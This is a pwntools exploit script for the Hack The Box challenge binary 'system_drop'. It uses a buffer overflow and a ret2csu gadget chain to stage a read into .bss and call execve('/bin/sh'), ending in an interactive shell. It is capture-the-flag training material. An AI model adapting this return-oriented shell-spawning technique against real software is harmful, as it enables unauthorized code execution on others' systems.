#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

"""
This is exploit to "system_drop", HTB chall, but can use as reference to write other SROP
"""

binary = context.binary = ELF('./system_drop')

payload  = b''
payload += 0x28 * b'A'

# CSU
'''
  4005b0:	4c 89 fa             	mov    rdx,r15
  4005b3:	4c 89 f6             	mov    rsi,r14
  4005b6:	44 89 ef             	mov    edi,r13d
  4005b9:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
  4005bd:	48 83 c3 01          	add    rbx,0x1
  4005c1:	48 39 dd             	cmp    rbp,rbx
  4005c4:	75 ea                	jne    4005b0 <__libc_csu_init+0x40>
  4005c6:	48 83 c4 08          	add    rsp,0x8
  4005ca:	5b                   	pop    rbx
  4005cb:	5d                   	pop    rbp
  4005cc:	41 5c                	pop    r12
  4005ce:	41 5d                	pop    r13
  4005d0:	41 5e                	pop    r14
  4005d2:	41 5f                	pop    r15
  4005d4:	c3                   	ret
'''

pop_rbx_rbp_r12_r13_r14_r15 = 0x4005ca
set_rdx_rsi_rdi_call_r12 = 0x4005b0

# read bytes to set rax as 0x3b and setup /bin/sh and pointer to syscall
payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0) # rbx
payload += p64(1) # rbp to get pass check
payload += p64(binary.got.read) # r12 pointer to function
payload += p64(0) # r13 -> rdi 
payload += p64(binary.bss()) # r14 -> rsi
payload += p64(constants.SYS_execve) # r15 -> rdx
payload += p64(set_rdx_rsi_rdi_call_r12)

# call syscall
payload += p64(0) # add rsp,0x8
payload += p64(0) # rbx
payload += p64(1) # rbp to get pass check
payload += p64(binary.bss() + 8) # r12 pointer to function
payload += p64(binary.bss()) # r13 -> rdi 
payload += p64(0) # r14 -> rsi
payload += p64(0) # r15 -> rdx
payload += p64(set_rdx_rsi_rdi_call_r12)

if args.REMOTE:
	p = remote('127.0.0.1',31056)
else:
	p = process(binary.path)

p.send(payload + b'A' * (0x100 - len(payload)))
fodder = b'/bin/sh\0' + p64(binary.sym._syscall)
p.send(fodder + (constants.SYS_execve - len(fodder)) * b'A')
p.interactive()
